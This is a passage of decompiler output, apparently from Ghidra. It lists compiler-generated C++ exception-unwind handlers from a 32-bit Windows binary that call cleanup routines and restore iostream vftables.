}



void Unwind_003c3130(void)

{
  int unaff_EBP;
  
  FUN_00399480((uint *)(unaff_EBP + 8));
  return;
}



void Unwind_003c3160(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c3190(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c31c0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c31f0(void)

{
  int unaff_EBP;
  
  *(undefined ***)
   (*(int *)(*(int *)(*(int *)(unaff_EBP + -0x10) + -0x68) + 4) +
   *(int *)(unaff_EBP + -0x10) + -0x68) =
       std::basic_istream<char,struct_std::char_traits<char>_>::vftable;
  return;
}



void Unwind_003c31fb(void)

{
  int unaff_EBP;
  
  FUN_003a18e0(*(undefined ***)(unaff_EBP + -0x14));
  return;
}



void Unwind_003c3220(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x40));
  return;
}



void Unwind_003c3250(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c32b0(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x10) & 1) != 0) {
    *(uint *)(unaff_EBP + -0x10) = *(uint *)(unaff_EBP + -0x10) & 0xfffffffe;
    FUN_00389360(*(void ***)(unaff_EBP + 8));
    return;
  }
  return;
}



void Unwind_003c32f0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 8));
  return;
}



void Unwind_003c3320(void)

{
  FUN_00385030();
  return;
}



void Unwind_003c3331(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(*(int *)(unaff_EBP + -0x18) + 4));
  return;
}



void Unwind_003c3380(void)

{
  int unaff_EBP;
  
  FUN_00399480((uint *)(unaff_EBP + -0x84));
  return;
}



void Unwind_003c338b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x48));
  return;
}



void Unwind_003c3393(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c33f0(void)

{
  int *piVar1;
  int unaff_EBP;
  
  piVar1 = *(int **)(*(int *)(***(int ***)(unaff_EBP + 8) + 4) + 0x38 +
                    (int)**(int ***)(unaff_EBP + 8));
  if (piVar1 != (int *)0x0) {
                    // WARNING: Could not recover jumptable at 0x003999c6. Too many branches
                    // WARNING: Treating indirect jump as call
    (**(code **)(*piVar1 + 8))();
    return;
  }
  return;
}



void Unwind_003c3420(void)

{
  int unaff_EBP;
  
  *(undefined ***)
   (*(int *)(*(int *)(*(int *)(unaff_EBP + -0x10) + -0x50) + 4) +
   *(int *)(unaff_EBP + -0x10) + -0x50) =
       std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;
  return;
}



void Unwind_003c3450(void)

{
  int *piVar1;
  int unaff_EBP;
  
  piVar1 = *(int **)(*(int *)(**(int **)(unaff_EBP + -0x28) + 4) + 0x38 +
                    (int)*(int **)(unaff_EBP + -0x28));
  if (piVar1 != (int *)0x0) {
                    // WARNING: Could not recover jumptable at 0x003999c6. Too many branches
                    // WARNING: Treating indirect jump as call
    (**(code **)(*piVar1 + 8))();
    return;
  }
  return;
}



void Unwind_003c3458(void)

{
  int unaff_EBP;
  
  FUN_003a74f0((int **)(unaff_EBP + -0x28));
  return;
}



void Unwind_003c3462(void)

{
  int unaff_EBP;
  
  FUN_00399480((uint *)(unaff_EBP + -0x18));
  return;
}



void Unwind_003c346a(void)

{
  int *piVar1;
  int unaff_EBP;
  
  piVar1 = *(int **)(*(int *)(**(int **)(unaff_EBP + -0x28) + 4) + 0x38 +
                    (int)*(int **)(unaff_EBP + -0x28));
  if (piVar1 != (int *)0x0) {
                    // WARNING: Could not recover jumptable at 0x003999c6. Too many branches
                    // WARNING: Treating indirect jump as call
    (**(code **)(*piVar1 + 8))();
    return;
  }
  return;
}



void Unwind_003c3490(void)

{
  int *piVar1;
  int unaff_EBP;
  
  piVar1 = *(int **)(*(int *)(**(int **)(unaff_EBP + -0x28) + 4) + 0x38 +
                    (int)*(int **)(unaff_EBP + -0x28));
  if (piVar1 != (int *)0x0) {
                    // WARNING: Could not recover jumptable at 0x003999c6. Too many branches
                    // WARNING: Treating indirect jump as call
    (**(code **)(*piVar1 + 8))();
    return;
  }
  return;
}



void Unwind_003c3498(void)

{
  int unaff_EBP;
  
  FUN_003a74f0((int **)(unaff_EBP + -0x28));
  return;
}



void Unwind_003c34a2(void)

{
  int unaff_EBP;
  
  FUN_00399480((uint *)(unaff_EBP + -0x18));
  return;
}



void Unwind_003c34aa(void)

{
  int *piVar1;
  int unaff_EBP;
  
  piVar1 = *(int **)(*(int *)(**(int **)(unaff_EBP + -0x28) + 4) + 0x38 +
                    (int)*(int **)(unaff_EBP + -0x28));
  if (piVar1 != (int *)0x0) {
                    // WARNING: Could not recover jumptable at 0x003999c6. Too many branches
                    // WARNING: Treating indirect jump as call
    (**(code **)(*piVar1 + 8))();
    return;
  }
  return;
}



void Unwind_003c34d0(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x34) & 1) != 0) {
    *(uint *)(unaff_EBP + -0x34) = *(uint *)(unaff_EBP + -0x34) & 0xfffffffe;
    FUN_00389360(*(void ***)(unaff_EBP + -0x38));
    return;
  }
  return;
}



void Unwind_003c34e9(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c34f1(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c3520(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x134));
  return;
}



void Unwind_003c352b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1dc));
  return;
}



void Unwind_003c3536(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1c0));
  return;
}



void Unwind_003c3541(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x188));
  return;
}



void Unwind_003c354c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1a4));
  return;
}



void Unwind_003c3557(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x16c));
  return;
}



void Unwind_003c3562(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c35a0(void)

{
  FUN_00385030();
  return;
}



void Unwind_003c3610(void)

{
  int unaff_EBP;
  
  FUN_003a18e0(*(undefined ***)(unaff_EBP + -0x10));
  return;
}



void Unwind_003c3640(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x48));
  return;
}



void Unwind_003c3648(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c3650(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x80));
  return;
}



void Unwind_003c3658(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -100));
  return;
}



void Unwind_003c3660(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x80));
  return;
}



void Unwind_003c3690(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f74));
  return;
}



void Unwind_003c369b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1f90));
  return;
}



void Unwind_003c36a6(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x1fac));
  return;
}



void Unwind_003c36e0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 0x2c));
  return;
}



void Unwind_003c36e8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 0xc));
  return;
}



void Unwind_003c36f0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x9a4));
  return;
}



void Unwind_003c36fb(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x950));
  return;
}



void Unwind_003c3706(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x96c));
  return;
}



void Unwind_003c3711(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x934));
  return;
}



void Unwind_003c371c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x988));
  return;
}



void Unwind_003c3727(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x9c0));
  return;
}



void Unwind_003c3732(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x9dc));
  return;
}



void Unwind_003c373d(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x918));
  return;
}



void Unwind_003c3748(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x9e0) & 1) != 0) {
    *(uint *)(unaff_EBP + -0x9e0) = *(uint *)(unaff_EBP + -0x9e0) & 0xfffffffe;
    FUN_00389360((void **)(unaff_EBP + -0x8fc));
    return;
  }
  return;
}



void Unwind_003c376a(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x9e0) & 2) != 0) {
    *(uint *)(unaff_EBP + -0x9e0) = *(uint *)(unaff_EBP + -0x9e0) & 0xfffffffd;
    FUN_00389360((void **)(unaff_EBP + -0x918));
    return;
  }
  return;
}



void Unwind_003c378c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x8fc));
  return;
}



void Unwind_003c3797(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x9e0) & 4) != 0) {
    *(uint *)(unaff_EBP + -0x9e0) = *(uint *)(unaff_EBP + -0x9e0) & 0xfffffffb;
    FUN_00389360((void **)(unaff_EBP + -0x918));
    return;
  }
  return;
}



void Unwind_003c37b9(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x9e0) & 8) != 0) {
    *(uint *)(unaff_EBP + -0x9e0) = *(uint *)(unaff_EBP + -0x9e0) & 0xfffffff7;
    FUN_00389360((void **)(unaff_EBP + -0x8fc));
    return;
  }
  return;
}



void Unwind_003c37db(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x9e0) & 0x10) != 0) {
    *(uint *)(unaff_EBP + -0x9e0) = *(uint *)(unaff_EBP + -0x9e0) & 0xffffffef;
    FUN_00389360((void **)(unaff_EBP + -0x918));
    return;
  }
  return;
}



void Unwind_003c37fd(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x9e0) & 0x20) != 0) {
    *(uint *)(unaff_EBP + -0x9e0) = *(uint *)(unaff_EBP + -0x9e0) & 0xffffffdf;
    FUN_00389360((void **)(unaff_EBP + -0x8fc));
    return;
  }
  return;
}



void Unwind_003c381f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x918));
  return;
}



void Unwind_003c382a(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x9e0) & 0x40) != 0) {
    *(uint *)(unaff_EBP + -0x9e0) = *(uint *)(unaff_EBP + -0x9e0) & 0xffffffbf;
    FUN_00389360((void **)(unaff_EBP + -0x918));
    return;
  }
  return;
}



void Unwind_003c384c(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x9e0) & 0x80) != 0) {
    *(uint *)(unaff_EBP + -0x9e0) = *(uint *)(unaff_EBP + -0x9e0) & 0xffffff7f;
    FUN_00389360((void **)(unaff_EBP + -0x8fc));
    return;
  }
  return;
}



void Unwind_003c3873(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x9e0) & 0x100) != 0) {
    *(uint *)(unaff_EBP + -0x9e0) = *(uint *)(unaff_EBP + -0x9e0) & 0xfffffeff;
    FUN_00389360((void **)(unaff_EBP + -0x918));
    return;
  }
  return;
}



void Unwind_003c389a(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x9e0) & 0x200) != 0) {
    *(uint *)(unaff_EBP + -0x9e0) = *(uint *)(unaff_EBP + -0x9e0) & 0xfffffdff;
    FUN_00389360((void **)(unaff_EBP + -0x8fc));
    return;
  }
  return;
}



void Unwind_003c38c1(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x9e0) & 0x400) != 0) {
    *(uint *)(unaff_EBP + -0x9e0) = *(uint *)(unaff_EBP + -0x9e0) & 0xfffffbff;
    FUN_00389360((void **)(unaff_EBP + -0x918));
    return;
  }
  return;
}



void Unwind_003c38e8(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x9e0) & 0x800) != 0) {
    *(uint *)(unaff_EBP + -0x9e0) = *(uint *)(unaff_EBP + -0x9e0) & 0xfffff7ff;
    FUN_00389360((void **)(unaff_EBP + -0x8fc));
    return;
  }
  return;
}



void Unwind_003c390f(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x918));
  return;
}



void Unwind_003c391a(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x8fc));
  return;
}



void Unwind_003c3950(void)

{
  void **ppvVar1;
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0xc78) & 1) != 0) {
    *(uint *)(unaff_EBP + -0xc78) = *(uint *)(unaff_EBP + -0xc78) & 0xfffffffe;
    ppvVar1 = *(void ***)(unaff_EBP + -0xc84);
    if (*ppvVar1 != (void *)0x0) {
      FUN_00389fb0();
      FUN_003aee4b(*ppvVar1);
    }
    *ppvVar1 = (void *)0x0;
    ppvVar1[1] = (void *)0x0;
    ppvVar1[2] = (void *)0x0;
    return;
  }
  return;
}



void Unwind_003c3972(void)

{
  FUN_0038a0f0();
  return;
}



void Unwind_003c397d(void)

{
  FUN_00385030();
  return;
}



void Unwind_003c3994(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(*(int *)(unaff_EBP + -0xc7c) + 4));
  return;
}



void Unwind_003c39a2(void)

{
  FUN_00385030();
  return;
}



void Unwind_003c39b9(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(*(int *)(unaff_EBP + -0xc80) + 4));
  return;
}



void Unwind_003c39f0(void)

{
  FUN_00385030();
  return;
}



void Unwind_003c3a01(void)

{
  FUN_00385030();
  return;
}



void Unwind_003c3a30(void)

{
  int *piVar1;
  int unaff_EBP;
  
  piVar1 = *(int **)(*(int *)(**(int **)(unaff_EBP + -0x1c) + 4) + 0x38 +
                    (int)*(int **)(unaff_EBP + -0x1c));
  if (piVar1 != (int *)0x0) {
                    // WARNING: Could not recover jumptable at 0x003999c6. Too many branches
                    // WARNING: Treating indirect jump as call
    (**(code **)(*piVar1 + 8))();
    return;
  }
  return;
}



void Unwind_003c3a38(void)

{
  int *piVar1;
  int unaff_EBP;
  
  piVar1 = *(int **)(*(int *)(**(int **)(unaff_EBP + -0x1c) + 4) + 0x38 +
                    (int)*(int **)(unaff_EBP + -0x1c));
  if (piVar1 != (int *)0x0) {
                    // WARNING: Could not recover jumptable at 0x003999c6. Too many branches
                    // WARNING: Treating indirect jump as call
    (**(code **)(*piVar1 + 8))();
    return;
  }
  return;
}



void Unwind_003c3a60(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 8));
  return;
}



void Unwind_003c3a68(void)

{
  void **ppvVar1;
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x2a4) & 1) != 0) {
    *(uint *)(unaff_EBP + -0x2a4) = *(uint *)(unaff_EBP + -0x2a4) & 0xfffffffe;
    ppvVar1 = *(void ***)(unaff_EBP + -0x2a8);
    if (*ppvVar1 != (void *)0x0) {
      FUN_00398480();
      FUN_003aee4b(*ppvVar1);
    }
    *ppvVar1 = (void *)0x0;
    ppvVar1[1] = (void *)0x0;
    ppvVar1[2] = (void *)0x0;
    return;
  }
  return;
}



void Unwind_003c3a8a(void)

{
  FUN_003959c0();
  return;
}



void Unwind_003c3a92(void)

{
  FUN_003959c0();
  return;
}



void Unwind_003c3ad0(void)

{
  int *piVar1;
  int unaff_EBP;
  
  piVar1 = *(int **)(*(int *)(**(int **)(unaff_EBP + -0x20) + 4) + 0x38 +
                    (int)*(int **)(unaff_EBP + -0x20));
  if (piVar1 != (int *)0x0) {
                    // WARNING: Could not recover jumptable at 0x003999c6. Too many branches
                    // WARNING: Treating indirect jump as call
    (**(code **)(*piVar1 + 8))();
    return;
  }
  return;
}



void Unwind_003c3ad8(void)

{
  int *piVar1;
  int unaff_EBP;
  
  piVar1 = *(int **)(*(int *)(**(int **)(unaff_EBP + -0x20) + 4) + 0x38 +
                    (int)*(int **)(unaff_EBP + -0x20));
  if (piVar1 != (int *)0x0) {
                    // WARNING: Could not recover jumptable at 0x003999c6. Too many branches
                    // WARNING: Treating indirect jump as call
    (**(code **)(*piVar1 + 8))();
    return;
  }
  return;
}



void Unwind_003c3b00(void)

{
  undefined **ppuVar1;
  int unaff_EBP;
  
  ppuVar1 = (undefined **)(unaff_EBP + -0x924);
  FUN_003a1e20(ppuVar1);
  *ppuVar1 = (undefined *)std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)ppuVar1);
  return;
}



void Unwind_003c3b0b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x800));
  return;
}



void Unwind_003c3b16(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x854));
  return;
}



void Unwind_003c3b21(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x870));
  return;
}



void Unwind_003c3b2c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x838));
  return;
}



void Unwind_003c3b37(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x81c));
  return;
}



void Unwind_003c3b42(void)

{
  int unaff_EBP;
  
  FUN_00399480((uint *)(unaff_EBP + -0x8d0));
  return;
}



void Unwind_003c3b4d(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x8c4));
  return;
}



void Unwind_003c3b58(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x8a8));
  return;
}



void Unwind_003c3b63(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x88c));
  return;
}



void Unwind_003c3ba0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 0x40));
  return;
}



void Unwind_003c3ba8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 0x24));
  return;
}



void Unwind_003c3bb0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 8));
  return;
}



void Unwind_003c3bb8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x6c));
  return;
}



void Unwind_003c3bc0(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x90));
  return;
}



void Unwind_003c3bcb(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x88));
  return;
}



void Unwind_003c3c00(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 0x28));
  return;
}



void Unwind_003c3c08(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 0xc));
  return;
}



void Unwind_003c3c10(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c3c18(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x58));
  return;
}



void Unwind_003c3c20(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x48));
  return;
}



void Unwind_003c3c50(void)

{
  int unaff_EBP;
  
  FUN_003aee4b(*(void **)(unaff_EBP + -0x10));
  return;
}



void Unwind_003c3c80(void)

{
  int unaff_EBP;
  
  *(undefined ***)(*(int *)(**(int **)(unaff_EBP + 8) + 4) + (int)*(int **)(unaff_EBP + 8)) =
       std::basic_istream<char,struct_std::char_traits<char>_>::vftable;
  return;
}



void Unwind_003c3cb0(void)

{
  undefined **ppuVar1;
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x10) & 1) != 0) {
    *(uint *)(unaff_EBP + -0x10) = *(uint *)(unaff_EBP + -0x10) & 0xfffffffe;
    ppuVar1 = (undefined **)(*(int *)(unaff_EBP + 8) + 0x50);
    *ppuVar1 = (undefined *)std::ios_base::vftable;
    std::ios_base::_Ios_base_dtor((ios_base *)ppuVar1);
    return;
  }
  return;
}



void Unwind_003c3ccc(void)

{
  int unaff_EBP;
  
  *(undefined ***)(*(int *)(**(int **)(unaff_EBP + 8) + 4) + (int)*(int **)(unaff_EBP + 8)) =
       std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;
  return;
}



void Unwind_003c3cd7(void)

{
  int unaff_EBP;
  
  FUN_003a18e0(*(undefined ***)(unaff_EBP + -0x14));
  return;
}



void Unwind_003c3d00(void)

{
  undefined **ppuVar1;
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x10) & 1) != 0) {
    *(uint *)(unaff_EBP + -0x10) = *(uint *)(unaff_EBP + -0x10) & 0xfffffffe;
    ppuVar1 = (undefined **)(*(int *)(unaff_EBP + 8) + 0x68);
    *ppuVar1 = (undefined *)std::ios_base::vftable;
    std::ios_base::_Ios_base_dtor((ios_base *)ppuVar1);
    return;
  }
  return;
}



void Unwind_003c3d1c(void)

{
  int unaff_EBP;
  
  *(undefined ***)(*(int *)(**(int **)(unaff_EBP + 8) + 4) + (int)*(int **)(unaff_EBP + 8)) =
       std::basic_istream<char,struct_std::char_traits<char>_>::vftable;
  return;
}



void __fastcall Unwind_003c3d27(undefined4 param_1,undefined4 *param_2)

{
  undefined *puVar1;
  int iVar2;
  undefined **ppuVar3;
  undefined **ppuVar4;
  int unaff_EBP;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  iVar2 = *(int *)(unaff_EBP + 8);
  ppuVar4 = (undefined **)(iVar2 + 0x10);
  puStack12 = &LAB_003c3618;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  *ppuVar4 = (undefined *)std::basic_filebuf<char,struct_std::char_traits<char>_>::vftable;
  local_8 = 0;
  ppuVar3 = ppuVar4;
  if (*(int *)(iVar2 + 100) != 0) {
    ppuVar3 = *(undefined ***)(iVar2 + 0x20);
    param_2 = (undefined4 *)(iVar2 + 0x58);
    if ((undefined4 *)*ppuVar3 == param_2) {
      puVar1 = *(undefined **)(iVar2 + 0x50);
      *ppuVar3 = *(undefined **)(iVar2 + 0x4c);
      ppuVar3 = *(undefined ***)(iVar2 + 0x30);
      *ppuVar3 = puVar1;
      param_2 = *(undefined4 **)(iVar2 + 0x40);
      *param_2 = 0;
    }
  }
  if (*(char *)(iVar2 + 0x60) != '\0') {
    FUN_003a2aa0(ppuVar3,param_2);
  }
  local_8 = 0xffffffff;
  FUN_003a18e0(ppuVar4);
  *in_FS_OFFSET = local_10;
  return;
}



void Unwind_003c3d50(void)

{
  undefined **ppuVar1;
  int unaff_EBP;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c306b;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  ppuVar1 = (undefined **)(unaff_EBP + -0x58);
  *(undefined ***)(*(int *)(*(int *)(unaff_EBP + -0xa8) + 4) + -0x50 + (int)ppuVar1) =
       std::basic_ostringstream<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
       vftable;
  local_8 = 0;
  FUN_003a69a0((undefined **)(unaff_EBP + -0xa4));
  local_8 = 0xffffffff;
  *(undefined ***)(*(int *)(*(int *)(unaff_EBP + -0xa8) + 4) + -0x50 + (int)ppuVar1) =
       std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;
  *ppuVar1 = (undefined *)std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)ppuVar1);
  *in_FS_OFFSET = local_10;
  return;
}



void Unwind_003c3d5b(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x10) & 1) != 0) {
    *(uint *)(unaff_EBP + -0x10) = *(uint *)(unaff_EBP + -0x10) & 0xfffffffe;
    FUN_00389360(*(void ***)(unaff_EBP + 8));
    return;
  }
  return;
}



void Unwind_003c3d74(void)

{
  int unaff_EBP;
  
  *(undefined ***)
   (*(int *)(*(int *)(*(int *)(unaff_EBP + 0xc) + -0x50) + 4) + *(int *)(unaff_EBP + 0xc) + -0x50) =
       std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;
  return;
}



void Unwind_003c3da0(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x34) & 1) != 0) {
    *(uint *)(unaff_EBP + -0x34) = *(uint *)(unaff_EBP + -0x34) & 0xfffffffe;
    FUN_00389360(*(void ***)(unaff_EBP + -0x38));
    return;
  }
  return;
}



void Unwind_003c3db9(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x34) & 2) != 0) {
    *(uint *)(unaff_EBP + -0x34) = *(uint *)(unaff_EBP + -0x34) & 0xfffffffd;
    *(undefined **)(unaff_EBP + -0x84) = (undefined *)std::ios_base::vftable;
    std::ios_base::_Ios_base_dtor((ios_base *)(undefined **)(unaff_EBP + -0x84));
    return;
  }
  return;
}



void Unwind_003c3dd5(void)

{
  int iVar1;
  int unaff_EBP;
  
  iVar1 = unaff_EBP + -0xcc;
  *(undefined ***)(*(int *)(*(int *)(unaff_EBP + -0xe4) + 4) + -0x18 + iVar1) =
       std::basic_iostream<char,struct_std::char_traits<char>_>::vftable;
  *(undefined ***)(*(int *)(*(int *)(unaff_EBP + -0xd4) + 4) + -8 + iVar1) =
       std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;
  *(undefined ***)(*(int *)(*(int *)(unaff_EBP + -0xe4) + 4) + -0x18 + iVar1) =
       std::basic_istream<char,struct_std::char_traits<char>_>::vftable;
  return;
}



void Unwind_003c3de0(void)

{
  int unaff_EBP;
  
  FUN_003a18e0(*(undefined ***)(unaff_EBP + -0xe8));
  return;
}



void Unwind_003c3deb(void)

{
  int unaff_EBP;
  
  FUN_003a57a0((int *)(unaff_EBP + -0xe4));
  return;
}



void Unwind_003c3df6(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x30));
  return;
}



void Unwind_003c3e30(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x10) & 1) != 0) {
    *(uint *)(unaff_EBP + -0x10) = *(uint *)(unaff_EBP + -0x10) & 0xfffffffe;
    FUN_00389360(*(void ***)(unaff_EBP + 8));
    return;
  }
  return;
}



void Unwind_003c3e49(void)

{
  undefined **ppuVar1;
  int unaff_EBP;
  
  ppuVar1 = (undefined **)(unaff_EBP + -0x70);
  FUN_003a1e20(ppuVar1);
  *ppuVar1 = (undefined *)std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)ppuVar1);
  return;
}



void Unwind_003c3e80(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c3eb0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x4c));
  return;
}



void Unwind_003c3ee0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x80));
  return;
}



void Unwind_003c3ee8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -100));
  return;
}



void Unwind_003c3ef0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x48));
  return;
}



void Unwind_003c3ef8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c3f30(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c3f60(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0xd88));
  return;
}



void Unwind_003c3f6b(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0xd6c));
  return;
}



void Unwind_003c3f76(void)

{
  FUN_003959c0();
  return;
}



void Unwind_003c3f81(void)

{
  FUN_003959c0();
  return;
}



void Unwind_003c3f8c(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0xd50));
  return;
}



void Unwind_003c3f97(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0xd34));
  return;
}



void Unwind_003c3fa2(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0xdc0));
  return;
}



void Unwind_003c3fe0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c3feb(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x158));
  return;
}



void Unwind_003c3ff6(void)

{
  int unaff_EBP;
  
  FUN_00389360(*(void ***)(unaff_EBP + -0x150));
  return;
}



void Unwind_003c4001(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c400c(void)

{
